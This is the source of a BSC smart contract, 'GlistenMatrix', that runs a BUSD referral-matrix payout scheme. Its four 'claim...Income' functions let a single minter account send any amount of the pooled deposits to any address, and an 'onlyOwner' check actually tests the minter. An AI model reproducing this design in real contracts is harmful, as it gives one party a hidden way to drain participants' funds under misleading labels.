/**
 *Submitted for verification at BscScan.com on 2023-03-08
*/

// SPDX-License-Identifier: MIT
pragma solidity >=0.4.23 <0.9.0;

interface IBEP20 {
  function balanceOf(address account) external view returns (uint256);
  function transfer(address recipient, uint256 amount) external returns (bool);
  function allowance(address _owner, address spender) external view returns (uint256);
  function approve(address spender, uint256 amount) external returns (bool);
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

contract GlistenMatrix {
    IBEP20 public BUSD;
    address public minter;

    struct User {
        uint id;
        address referrer;
        uint partnersCount;
        
        mapping(uint8 => bool) activeX3Levels;
        mapping(uint8 => X3) x3Matrix;
    }


    struct X3 {
        address currentReferrer;
        address[] referrals;
        bool blocked;
        uint reinvestCount;
    }
    
    uint8 public constant LAST_LEVEL = 6;
    
    mapping(address => User) public users;
    mapping(uint => address) public idToAddress;
    mapping(uint => address) public userIds;
    mapping(address => uint) public balances; 

    uint public lastUserId = 2;
    address public owner;
    
    mapping(uint8 => uint) public levelPrice;
    mapping(uint8 => uint) public levelActiveIncomPrice;
    
    
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Registration(address indexed user, address indexed referrer, uint indexed userId, uint referrerId);
    event Reinvest(address indexed user, address indexed currentReferrer, address indexed caller, uint8 matrix, uint8 plan);
    event Upgrade(address indexed user, address indexed referrer, uint8 matrix, uint8 plan);
    event NewUserPlace(address indexed user, address indexed referrer, uint8 matrix, uint8 plan, uint8 place);
    
    event ClaimFullPackageEarning(address indexed user, uint amount);
    event ClaimAutoPoolEarning(address indexed user, uint amount);
    event ClaimFastrackEarning(address indexed user, uint amount);
    event ClaimTvcEarning(address indexed user, uint amount);

     constructor(address ownerAddress, address _minter, IBEP20 _busd) {
        BUSD = IBEP20(_busd);
        levelPrice[1] = 30 ether;
        levelActiveIncomPrice[1] = 10 ether;
        
        for (uint8 i = 2; i <= LAST_LEVEL; i++) {
            levelPrice[i] = levelPrice[i-1] * 2;
            levelActiveIncomPrice[i] = levelActiveIncomPrice[i-1] * 2;
        }

        owner = ownerAddress;
        minter = _minter;

        users[ownerAddress].id = 1;
        users[ownerAddress].referrer = address(0);
        users[ownerAddress].partnersCount = uint(0);

        idToAddress[1] = ownerAddress;
        
        for (uint8 i = 1; i <= LAST_LEVEL; i++) {
            users[ownerAddress].activeX3Levels[i] = true;
        }
                
        userIds[1] = ownerAddress;
    }
    

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(minter == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(minter, newOwner);
        minter = newOwner;
    }


    function registrationExt(address referrerAddress, uint token) external {
        registration(msg.sender, referrerAddress, token);
    }
    
    function buyNewLevel(uint8 level, uint token) external {
        require(isUserExists(msg.sender), "user is not exists. Register first.");
        require(token == levelPrice[level], "invalid price");
        require(level > 1 && level <= LAST_LEVEL, "invalid level");

        require(!users[msg.sender].activeX3Levels[level], "level already activated");

        IBEP20(BUSD).transferFrom(msg.sender, address(this), token);
        
        address freeX3Referrer = findFreeX3Referrer(msg.sender, level);
        users[msg.sender].x3Matrix[level].currentReferrer = freeX3Referrer;
        users[msg.sender].activeX3Levels[level] = true;
        updateX3Referrer(msg.sender, freeX3Referrer, level);

        emit Upgrade(msg.sender, freeX3Referrer, 1, level);        
    }    
    
    function registration(address userAddress, address referrerAddress, uint token) private {
        require(token == levelPrice[1], "invalid price");
        require(!isUserExists(userAddress), "user exists");
        require(isUserExists(referrerAddress), "referrer not exists");
        
        uint32 size;
        assembly {
            size := extcodesize(userAddress)
        }
        require(size == 0, "cannot be a contract");
        
        IBEP20(BUSD).transferFrom(msg.sender, address(this), token);
        
        users[userAddress].id = lastUserId;
        users[userAddress].referrer = referrerAddress;
        users[userAddress].partnersCount = 0;
        
        idToAddress[lastUserId] = userAddress;
        
        users[userAddress].referrer = referrerAddress;
        
        users[userAddress].activeX3Levels[1] = true; 
        
        
        userIds[lastUserId] = userAddress;
        lastUserId++;
        
        users[referrerAddress].partnersCount++;

        address freeX3Referrer = findFreeX3Referrer(userAddress, 1);
        users[userAddress].x3Matrix[1].currentReferrer = freeX3Referrer;
        updateX3Referrer(userAddress, freeX3Referrer, 1);

        emit Registration(userAddress, referrerAddress, users[userAddress].id, users[referrerAddress].id);
    }
    
    function updateX3Referrer(address userAddress, address referrerAddress, uint8 level) private {
        users[referrerAddress].x3Matrix[level].referrals.push(userAddress);

        if (users[referrerAddress].x3Matrix[level].referrals.length < 3) {
            emit NewUserPlace(userAddress, referrerAddress, 1, level, uint8(users[referrerAddress].x3Matrix[level].referrals.length));
            return sendBUSDDividends(referrerAddress, levelActiveIncomPrice[level]);
        }
        
        emit NewUserPlace(userAddress, referrerAddress, 1, level, 3);
        
        users[referrerAddress].x3Matrix[level].referrals = new address[](0);

        //create new one by recursion
        if (referrerAddress != owner) {
            //check referrer active level
            address freeReferrerAddress = findFreeX3Referrer(referrerAddress, level);
            if (users[referrerAddress].x3Matrix[level].currentReferrer != freeReferrerAddress) {
                users[referrerAddress].x3Matrix[level].currentReferrer = freeReferrerAddress;
            }
            
            users[referrerAddress].x3Matrix[level].reinvestCount++;
            emit Reinvest(referrerAddress, freeReferrerAddress, userAddress, 1, level);
            updateX3Referrer(referrerAddress, freeReferrerAddress, level);
        } else {
            sendBUSDDividends(owner,  levelActiveIncomPrice[level]);
            users[owner].x3Matrix[level].reinvestCount++;
            emit Reinvest(owner, address(0), userAddress, 1, level);
        }
    }
    
    
    function findFreeX3Referrer(address userAddress, uint8 level) public view returns(address findAddress) {
        while (true) {
            if (users[users[userAddress].referrer].activeX3Levels[level]) {
                return users[userAddress].referrer;
            }
            
            userAddress = users[userAddress].referrer;
        }
    }

    function claimAutoPoolIncome(address user, uint256 amount) onlyOwner external {
        require(amount <= BUSD.balanceOf(address(this)), "Insufficient fund in pool for withdraw");
        sendBUSDDividends(user, amount);
        emit ClaimAutoPoolEarning(user, amount);
    }

    function claimFastrackIncome(address user, uint256 amount) onlyOwner external {
        require(amount <= BUSD.balanceOf(address(this)), "Insufficient fund in pool for withdraw");
        sendBUSDDividends(user, amount);
        emit ClaimFastrackEarning(user, amount);
    }

    function claimTvcIncome(address user, uint256 amount) onlyOwner external {
        require(amount <= BUSD.balanceOf(address(this)), "Insufficient fund in pool for withdraw");
        sendBUSDDividends(user, amount);
        emit ClaimTvcEarning(user, amount);
    }
    
    function claimFullPackageIncome(address user, uint256 amount) onlyOwner external {
        require(amount <= BUSD.balanceOf(address(this)), "Insufficient fund in pool for withdraw");
        sendBUSDDividends(user, amount);
        emit ClaimFullPackageEarning(user, amount);
    }

    function usersActiveX3Levels(address userAddress, uint8 level) public view returns(bool) {
        return users[userAddress].activeX3Levels[level];
    }
    

    function usersX3Matrix(address userAddress, uint8 level) public view returns(address, address[] memory, bool, uint) {
        return (users[userAddress].x3Matrix[level].currentReferrer,
                users[userAddress].x3Matrix[level].referrals,
                users[userAddress].x3Matrix[level].blocked,users[userAddress].x3Matrix[level].reinvestCount);
    }
    
    
    function isUserExists(address user) public view returns (bool) {
        return (users[user].id != 0);
    }
    

    function sendBUSDDividends(address userAddress, uint256 amount) private {
            IBEP20(BUSD).transfer(userAddress, amount);
    }
    
    function bytesToAddress(bytes memory bys) private pure returns (address addr) {
        assembly {
            addr := mload(add(bys, 20))
        }
    }
}